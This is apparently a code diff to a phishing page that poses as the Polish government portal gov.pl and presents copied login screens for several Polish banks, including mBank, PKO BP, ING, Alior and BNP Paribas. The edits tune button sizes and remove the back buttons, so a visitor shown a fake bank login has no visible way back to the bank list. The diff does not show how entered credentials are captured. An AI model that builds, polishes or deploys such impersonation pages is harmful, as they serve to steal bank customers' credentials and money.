@@ -8,7 +8,7 @@
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
     <style>
         /* ============================================================
-           FULL CSS — ZMIANY DODANE NA KOŃCU
+           FULL CSS
            ============================================================ */
         * {
             margin: 0;
@@ -821,6 +821,10 @@
         .bank-btn {
             width: 191px;
             height: 80px;
+            min-width: 191px;
+            min-height: 80px;
+            max-width: 191px;
+            max-height: 80px;
             border: 2px solid #003b6f;
             border-radius: 8px;
             background: #ffffff;
@@ -831,6 +835,7 @@
             transition: border-color 0.2s, box-shadow 0.2s, transform 0.2s;
             padding: 14px;
             -webkit-tap-highlight-color: transparent;
+            flex-shrink: 0;
         }
 
         .bank-btn:hover {
@@ -1113,44 +1118,6 @@
         .login-screen .contact-info .contact-link:hover {
             color: #005a8c;
             text-decoration: underline;
-        }
-
-        /* ===== BACK BUTTON — UNIWERSALNY ===== */
-        .back-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: transparent;
-            border: none;
-            color: #003b6f;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            padding: 12px 16px;
-            transition: color 0.2s;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        .back-btn:hover {
-            color: #001f3f;
-        }
-
-        .back-btn:active {
-            color: #001f3f;
-            transform: scale(0.97);
-        }
-
-        .back-btn .arrow {
-            font-size: 20px;
-            line-height: 1;
-        }
-
-        .back-btn-wrapper {
-            background: #ffffff;
-            padding: 8px 0 4px 0;
-            border-bottom: 1px solid #f0f2f5;
-            display: flex;
-            align-items: center;
         }
 
         /* ===== BANK 2 — Millennium ===== */
@@ -2863,10 +2830,9 @@
         }
 
         /* ============================================================
-           RESPONSIVE
+           RESPONSIVE — IPHONE
            ============================================================ */
 
-        /* iPhone safe areas */
         @supports (padding: max(0px)) {
             .header {
                 padding-left: max(20px, env(safe-area-inset-left));
@@ -3003,10 +2969,14 @@
             .bank-grid {
                 grid-template-columns: repeat(2, 1fr);
                 max-width: 440px;
+                gap: 16px;
             }
             .bank-btn {
                 width: 100%;
+                max-width: 191px;
                 height: 70px;
+                min-height: 70px;
+                max-height: 70px;
             }
             .bank-btn img {
                 width: 140px;
@@ -3324,8 +3294,11 @@
                 gap: 12px;
             }
             .bank-btn {
-                height: 65px;
+                height: 60px;
+                max-height: 60px;
+                min-height: 60px;
                 width: 100%;
+                max-width: 191px;
             }
             .bank-btn img {
                 width: 120px;
@@ -3384,16 +3357,6 @@
             }
             .login-screen .login-grid {
                 gap: 24px;
-            }
-            .back-btn {
-                font-size: 14px;
-                padding: 10px 14px;
-            }
-            .back-btn .arrow {
-                font-size: 18px;
-            }
-            .back-btn-wrapper {
-                padding: 4px 0 2px 0;
             }
             .bank2-full-page .bank2-container {
                 padding: 16px 16px 30px;
@@ -3750,7 +3713,10 @@
             }
             .bank-btn {
                 height: 55px;
+                max-height: 55px;
+                min-height: 55px;
                 width: 100%;
+                max-width: 191px;
             }
             .bank-btn img {
                 width: 100px;
@@ -3815,16 +3781,6 @@
             }
             .login-screen .login-grid {
                 gap: 18px;
-            }
-            .back-btn {
-                font-size: 13px;
-                padding: 8px 12px;
-            }
-            .back-btn .arrow {
-                font-size: 16px;
-            }
-            .back-btn-wrapper {
-                padding: 2px 0 2px 0;
             }
             .bank2-full-page .bank2-container {
                 padding: 12px 12px 24px;
@@ -4321,9 +4277,6 @@
 
             <!-- ===== BANK 1 ===== -->
             <section class="login-screen" id="loginScreen1">
-                <div class="back-btn-wrapper">
-                    <button class="back-btn" onclick="goBackToBanks()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="login-container">
                     <div class="login-grid">
                         <div class="login-left">
@@ -4367,9 +4320,6 @@
 
             <!-- ===== BANK 2 ===== -->
             <div class="bank2-full-page" id="loginScreen2">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="goBackToBanks2()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank2-container">
                     <div class="bank2-box">
                         <div class="bank2-logo">
@@ -4404,9 +4354,6 @@
 
             <!-- ===== BANK 3 ===== -->
             <div class="bank3-full-page" id="loginScreen3">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="closeLoginScreen3()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank3-header">
                     <div class="bank3-header-content">
                         <span class="bank3-logo"><img src="logo-white.svg" alt="Bank 3"></span>
@@ -4439,9 +4386,6 @@
 
             <!-- ===== BANK 4 ===== -->
             <div class="bank4-full-page" id="loginScreen4">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="closeLoginScreen4()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank4-container">
                     <div class="bank4-title">potwierdź swoją tożsamość</div>
                     <div class="bank4-subtitle">zaloguj się do mBanku loginem i hasłem</div>
@@ -4463,9 +4407,6 @@
 
             <!-- ===== BANK 5 ===== -->
             <div class="bank5-full-page" id="loginScreen5">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="closeLoginScreen5()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank5-container">
                     <div class="bank5-box">
                         <div class="bank5-alert">
@@ -4496,9 +4437,6 @@
 
             <!-- ===== BANK 6 ===== -->
             <div class="bank6-full-page" id="loginScreen6">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="closeLoginScreen6()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank6-container">
                     <div class="bank6-left">
                         <div class="bank6-title">Logowanie</div>
@@ -4531,9 +4469,6 @@
 
             <!-- ===== BANK 7 ===== -->
             <div class="bank7-full-page" id="loginScreen7">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="closeLoginScreen7()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank7-container">
                     <div class="bank7-logo"><img src="bnp-paribas-logo-full.svg" alt="BNP Paribas"></div>
                     <div class="bank7-box">
@@ -4567,9 +4502,6 @@
 
             <!-- ===== BANK 8 ===== -->
             <div class="bank8-full-page" id="loginScreen8">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="closeLoginScreen8()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank8-container">
                     <div class="bank8-left">
                         <div class="bank8-favicon"><img src="favicon.ico" alt="PKO BP"></div>
@@ -4600,9 +4532,6 @@
 
             <!-- ===== BANK 9 ===== -->
             <div class="bank9-full-page" id="loginScreen9">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="closeLoginScreen9()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank9-container">
                     <div class="bank9-top">
                         <div class="bank9-logo"><img src="alior-logo.svg" alt="Alior Bank"></div>
@@ -4629,9 +4558,6 @@
 
             <!-- ===== BANK 10 — BEZ LOGO ===== -->
             <div class="bank10-full-page" id="loginScreen10">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="closeLoginScreen10()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank10-container">
                     <div class="bank10-main">
                         <div class="bank10-left"></div>
@@ -4666,9 +4592,6 @@
 
             <!-- ===== BANK 12 ===== -->
             <div class="bank12-full-page" id="loginScreen12">
-                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
-                    <button class="back-btn" onclick="closeLoginScreen12()"><span class="arrow">‹</span> Powrót</button>
-                </div>
                 <div class="bank12-container">
                     <div class="bank12-box">
                         <div class="bank12-logo"><img src="logo_ing-logo.svg" alt="ING Bank Śląski"></div>
@@ -4826,7 +4749,7 @@
             document.getElementById(bankId).classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
-            navigateTo({ page: 'bank', bank: bankName }, '#bank-' + bankName.toLowerCase().replace(/\s/g, '-'));
+            navigateTo({ page: 'bank', bankId: bankId, bank: bankName }, '#bank-' + bankName.toLowerCase().replace(/\s/g, '-'));
         }
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -5210,13 +5133,7 @@
         }
 
         function openLoginScreen2() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            const bank2 = document.getElementById('loginScreen2');
-            bank2.classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-            navigateTo({ page: 'bank', bankId: 'loginScreen2', bank: 'Bank 2' }, '#bank-2');
+            navigateToBank('loginScreen2', 'Bank 2');
         }
 
         function openLoginScreen3() {
@@ -5255,47 +5172,6 @@
             navigateToBank('loginScreen12', 'ING Bank Śląski');
         }
 
-        // ===== CLOSE FUNCTIONS =====
-        function closeLoginScreen2() {
-            goBackToBanks2();
-        }
-
-        function closeLoginScreen3() {
-            goBackToBanks();
-        }
-
-        function closeLoginScreen4() {
-            goBackToBanks();
-        }
-
-        function closeLoginScreen5() {
-            goBackToBanks();
-        }
-
-        function closeLoginScreen6() {
-            goBackToBanks();
-        }
-
-        function closeLoginScreen7() {
-            goBackToBanks();
-        }
-
-        function closeLoginScreen8() {
-            goBackToBanks();
-        }
-
-        function closeLoginScreen9() {
-            goBackToBanks();
-        }
-
-        function closeLoginScreen10() {
-            goBackToBanks();
-        }
-
-        function closeLoginScreen12() {
-            goBackToBanks();
-        }
-
         // ===== ESC =====
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') {
@@ -5309,16 +5185,16 @@
                 const bank9 = document.getElementById('loginScreen9');
                 const bank10 = document.getElementById('loginScreen10');
                 const bank12 = document.getElementById('loginScreen12');
-                if (bank2.classList.contains('visible')) closeLoginScreen2();
-                if (bank3.classList.contains('visible')) closeLoginScreen3();
-                if (bank4.classList.contains('visible')) closeLoginScreen4();
-                if (bank5.classList.contains('visible')) closeLoginScreen5();
-                if (bank6.classList.contains('visible')) closeLoginScreen6();
-                if (bank7.classList.contains('visible')) closeLoginScreen7();
-                if (bank8.classList.contains('visible')) closeLoginScreen8();
-                if (bank9.classList.contains('visible')) closeLoginScreen9();
-                if (bank10.classList.contains('visible')) closeLoginScreen10();
-                if (bank12.classList.contains('visible')) closeLoginScreen12();
+                if (bank2.classList.contains('visible')) goBackToBanks2();
+                if (bank3.classList.contains('visible')) goBackToBanks();
+                if (bank4.classList.contains('visible')) goBackToBanks();
+                if (bank5.classList.contains('visible')) goBackToBanks();
+                if (bank6.classList.contains('visible')) goBackToBanks();
+                if (bank7.classList.contains('visible')) goBackToBanks();
+                if (bank8.classList.contains('visible')) goBackToBanks();
+                if (bank9.classList.contains('visible')) goBackToBanks();
+                if (bank10.classList.contains('visible')) goBackToBanks();
+                if (bank12.classList.contains('visible')) goBackToBanks();
             }
         });
     </script>
